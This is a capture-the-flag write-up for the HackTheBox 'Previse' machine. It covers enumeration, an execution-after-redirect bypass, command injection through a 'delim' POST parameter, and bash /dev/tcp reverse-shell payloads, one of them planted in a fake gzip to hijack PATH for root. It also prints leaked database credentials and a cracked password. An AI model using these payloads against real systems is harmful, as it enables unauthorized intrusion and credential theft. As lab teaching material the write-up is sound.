---
title: "Previse"
description: "Previse HTB Writeup"
homepage: "https://torrytw.ooo"
date: 2022-07-21T18:32:03+08:00
sort: ["all", "htb", "writeup"]
draft: false
---

![Box Info](/htbprevise/info.png)
Previse from HTB Writeup | Machine <a href="https://app.hackthebox.com/machines/373">#737</a>


<aside id="toc">
    <h4>Table of Contents</h4>
	<h4><a href="#enumeration-22">1. </a>Enumeration 1/2</h4>
	<h4><a href="#http-12">2. </a>HTTP 1/2</h4>
	<h4><a href="#enumeration-22">3. </a>Enumeration 2/2</h4>
	<h4><a href="#null-session">4. </a>Null Session</h4>
	<h4><a href="#http-22">5. </a>HTTP 2/2</h4>
	<h4><a href="#command-injection">6. </a>Command Injection</h4>
	<h4><a href="#foothold">7. </a>Foothold</h4>
	<h4><a href="#database--hash-cracking">8. </a>Database + Hash Cracking</h4>
	<h4><a href="#usertxt">9. </a>user.txt</h4>
	<h4><a href="#privilege-escalation">10. </a>Privilege Escalation</h4>
	<h4><a href="#roottxt">11. </a>root.txt</h4>
	<h4><a href="#conclusion">11. </a>Conclusion</h4>
</aside>

Setting Host:
{{< highlight bash >}}
sudo echo "10.10.11.104 previse.htb" >> /etc/hosts
{{< /highlight >}}
  
# Enumeration 1/2
  
We can find 2 open ports with nmap as follows:

{{< highlight bash >}}
nmap -Pn -sV previse.htb > scan.txt
{{< /highlight >}}

Result:

{{< highlight bash >}}
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{{< /highlight >}}

On the HTB platform Easy boxes do not have red hearrings, with this in mind we can assume these to be the only 2 services running as the HTTP site is serving content.

# HTTP 1/2

![Initial Look](/htbprevise/http12.png)

We can see a login page, however more importantly we notice the URL has redirected us from the root / directory to /login.php.
This information is immediately useful as we can begin to fuzz for directories on the page. 
Aside from this, we can explore the pages behaviour, supplying invalid credentials returns "Invalid Username or Password"
No further links can be seen from the /login.php page.

![Invalid Credentials](/htbprevise/2http12.png)

# Enumeration 2/2

Using dirbuster we can bruteforce possible directories hosted on the site.

{{< highlight bash >}}
dirbuster -H -l /directory-list-lowercase-2.3-medium.txt -g -e php -t 100 -u http://previse.htb > dirb.txt
{{< /highlight >}}

In this instance I used the <a href="https://github.com/3ndG4me/KaliLists/blob/master/dirbuster/directory-list-2.3-medium.txt">directory-list-lowercase-2.3-medium.txt</a> wordlists from KaliLists.

We find the following files that are of interest to us:
{{< highlight bash >}}
File found: /index.php - 302
File found: /download.php - 302
File found: /status.php - 302
File found: /files.php - 302
File found: /accounts.php - 302
File found: /file_logs.php - 302
File found: /logout.php - 302
File found: /login.php - 200
File found: /config.php - 200
{{< /highlight >}}

Visiting all these directories we recieve a 302 FOUND followed by a redirect, we cannot access the contents of /config.php despite the 200 OK status code.

# Null Session

Focusing on the /accounts.php directory, which is where we assume we need to access in order to create an account and succesfully login via /login.php, we can analyse the request in burp suite.

Intercepting the request shows nothing interesting, however upon analysing the response we can identify a possible bypass to obtain a session on the site without a login.

![Analysing Response](/htbprevise/nullsession.png)

We can see that the response shows page contents of a page, what we assume to be for logged in users. (on /accounts.php)

Modifying the response headers we can skip the redirect and obtain a session on this page:
{{< highlight bash >}}
302 FOUND -> 200 OK
{{< /highlight >}}
We now have access to the page: (/accounts.php)  
This is possible due to an EAR vulnerability in the backend PHP, which you can read more about from OWASP <a href="https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR)">here</a>.

![Session Achieved](/htbprevise/2nullsession.png)

To explore the page further, we can use the burp proxy to continuously update the response headers and this would allow us to explore without creating an account, however, in this instance we can simply create an account from the page /accounts.php shown above.  
I created an account with the credentials `torry:password`  
Modifying the request once more, the account is successfully created.

Logging in from /login.php works!
We have achieved a persistent session on the site.

![Account Session](/htbprevise/3nullsession.png)


# HTTP 2/2

Exploring the site we can find /status.php indicating the usage of a MySQL server running.  

![/status.php](/htbprevise/http22.png)

We also come across /files.php and file_logs.php 
![/files.php](/htbprevise/2http22.png)
![/file_logs.php](/htbprevise/http4.png)

/files.php reveals a zip file uploaded by a user "m4lwhere" named "SITEBACKUP.zip"
Unzipping and exploring the file we see it is a backup of all the backend php code used for the website.
We find 2 files of interest being logs.php and config.php

config.php reveals credentials for a MySQL server, we reference this from the /status.php page from earlier which may be a potential foothold via credential stuffing.
Credential stuffing for user "m4lwhere", "root" and default MySQL logins proves ineffect on the target server over ssh.

{{< highlight php >}}
File: config.php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
{{< /highlight >}}

logs.php reveals information in a comment left by a developer.

{{< highlight php >}}
File: logs.php
<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
}
?> 
{{< /highlight >}}

The comment reveals that the "delim" paramter is parsed in python on the target server.
Referencing the file_logs.php page from earlier, we can set a deliminator from a small drop down menu. 
The options appear as "space", "tab" and "comma"
This function of the website allows us to download a log file of who has downloaded files from the /files.php page we saw earlier.

[missing example]

Analysing the request made to retrieve server logs lets us spot a potential command injection vulnerability as per the information we learned earlier from the logs.php file.

# Command Injection

![Deliminator Request](/htbprevise/commandinjection.png)

Analysing the request in burpsuite, with the knowledge it is passed through the shell in python, we can attempt command execution by appending a semicolon onto the deliminator paramter.

{{< highlight bash >}}
delim=comma;id
{{< /highlight >}}

After modifying the request in burpsuite, we do not recieve an error however the normal behaviour of recieving the log file.
To confirm the existence of the vulnerability, we create a payload that will touch a new file onto the server which we should be able to access from the URL. This is assuming that the server is in the www-data working directory.

{{< highlight bash >}}
delim=space;touch+thisfileexists.txt;echo+"i+exist"+>>+thisfileexists.txt
{{< /highlight >}}
*this will create a text file and write "i exist", the '+' symbols are representative of spaces as we must URL encode this for the server to understand.

![Command Injection Poc](/htbprevise/2commandinjection.png)

Navigating the the url /thisfileexists.txt in our browser, we can confirm command injection through the delimiter paramter!

# Foothold

We can create a payload to spawn a reverse shell on the system. Using a bash TCP payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/">PayloadAllTheThings</a> we can attempt to recieve a connection.
* Don't forget to URL encode the '&' sybols as to not interpret the payload as multiple bash commands!

{{< highlight bash >}}
delim=comma;bash+-c+'sh+-i+>%26+/dev/tcp/0.0.0.0/9001+0>%261'
{{< /highlight >}}

We can set up a listener on netcat to catch the reverse shell:
{{< highlight bash >}}
nc -lvnp 9001
{{< /highlight >}}

After sending the request, we recieve a connection back!

{{< highlight bash >}}
listening on [any] 9001 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.104] 41578
sh: 0: can't access tty; job control turned off
$ whoami
www-data
{{< /highlight >}}

As expected, we are the user www-data. Exploring the system reveals the location of the user flag however we do have permissions to access it. The flag is in the /m4lwhere/ home directory.

Before continuing, we can upgrade and spawn a stty shell as we know python is on the system, however we can confirm this again:

{{< highlight bash >}}
$ which python3
/usr/bin/python3
{{< /highlight >}}

*  I am using python3 to spawn the shell as im working in zsh rather than bash.

{{< highlight bash >}}
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
[*] CTRL + Z
stty raw -echo; fg
[*] Return
export TERM=xterm-256color
{{< /highlight >}}

This spawns a more stable shell for us the work with.

# Database + Hash Cracking

We previously discovered the existence of a MySQL server and plaintext credentials, we can attempt to authenticate to the server with the following:

{{< highlight bash >}}
mysql -h localhost -u root -p'mySQL_p@ssw0rd!:)'
mysql>
{{< /highlight >}}

We succesfully connected the the MySQL Server!
We can explore the database(s) as follows:

{{< highlight bash >}}
mysql>show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use previse;
mysql> show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)
SELECT * FROM accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | torry    | $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0 | 2022-07-21 09:27:52 |
+----+----------+------------------------------------+---------------------+
2 rows in set (0.00 sec)
{{< /highlight >}}

We discover the password hashes of all the users with an account on the website, including the hash of the "m4lwhere" user in which the user flag is stored.
* Try cracking my password hash!

In order to crack m4lwhere's hash, we first need to identify it which can be done with the use of a <a href="https://hashes.com/en/tools/hash_identifier">Hash Identifier</a>.  
In this case, it appears to be MD5.
Using hashcat we can set the hash mode to 500 (md5) and use the <a href="https://github.com/3ndG4me/KaliLists/blob/master/rockyou.txt.gz">rockyou</a> wordlist from KaliLists

{{< highlight bash >}}
hashcat -m 500 hash /usr/share/wordlists/rockyou.txt 
{{< /highlight >}}

After some waiting, we succesfully cracked the hash!

{{< highlight bash >}}
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
{{< /highlight >}}

# user.txt

At this stage we can abandom our reverse shell as the credentials we found for the m4lwhere user appear to be valid over the ssh service.

{{< highlight bash >}}
ssh m4lwhere@previse.htb
m4lwhere@previse.htb's password: 
ilovecody112235!
{{< /highlight >}}

With this we can simply cat the user.txt file and obtain the flag!

{{< highlight bash >}}
cat user.txt
[redacted]
{{< /highlight >}}

# Privilege Escalation

Before instictively running linpeas, we can first see if the m4lwhere user is in the sudoers group and what commands are permitted.

{{< highlight bash >}}
sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
{{< /highlight >}}

m4lwhere can execute a script with sudo. The script conctents are found the the /opt/scripts/ directory.

{{< highlight bash >}}
File: /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
{{< /highlight >}}

This script is calling running the gzip command, however as this script is sudoable, the reference to gzip is a reference from the path, this may allow us to trick the script into running our own gzip command by exporting a new path of our choice. This is our vector for privilege escalation.

The current path appears as:

{{< highlight bash >}}
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
{{< /highlight >}}

To create our own gzip command, we first create a directory in the /tmp/ directory where we will put our script.
We can then export this directory as our new path.

{{< highlight bash >}}
mkdir /tmp/newpath
export PATH=/tmp/newpath:$PATH
{{< /highlight >}}

Changing into our new directory, we can write a our malicious script to spawn a reverse shell as the root user.

{{< highlight bash >}}
File: gzip
#!/bin/bash
bash -i >& /dev/tcp/0.0.0.0/9001 0>&1
{{< /highlight >}}

Setting up a listener on netcat, we can catch the reverse shell after running the script.

{{< highlight bash >}}
chmod +x gzip
sudo /opt/scripts/access_backup.sh
{{< /highlight >}}

Catching the reverse shell with our listener we get a root shell!

{{< highlight bash >}}
nc -lvnp 9001
listening on [any] 9001 ...
connect to [0.0.0.0] from (UNKNOWN) [10.10.11.104] 41578
sh: 0: can't access tty; job control turned off
$ whoami
root
{{< /highlight >}}

With this we now own the system!

# root.txt

Following the privilege escalation technique, we can simply cat the root.txt flag, however, an alternative `CTF` style method to obtain the flag is to echo it into a file without the need of spawning a new shell. There are multiple ways to do this, however I found using the 'cp' command ineffective as the files permissions were still owned by root.

We will use the same script as last time however instead of a reverse shell we will echo the root flag to a file in our current directory.

{{< highlight bash >}}
File: gzip
#!/bin/bash
echo "$(</root/root.txt.txt)" > /tmp/newpath/flag.txt
{{< /highlight >}}

Running the script:

{{< highlight bash >}}
chmod +x gzip
sudo /opt/scripts/access_backup.sh
{{< /highlight >}}

The script succesfully executes and we recieve the root flag in the /tmp/newpath/ directory as flag.txt!
We can cat the contents of the file as the m4lwhere user.

{{< highlight bash >}}
cat flag.txt
[redacted]
{{< /highlight >}}

# Conclusion
  
  
Box by m4lwhere | <a href="https://app.hackthebox.com/users/107145">Give Respect</a>  
fun box.
![pwned](/htbprevise/pwned.png)

---------------- 

Share via <a href="https://torry.link/index/previse">link</a>
Return to the <a href="https://torrytw.ooo/index/">Index</a>
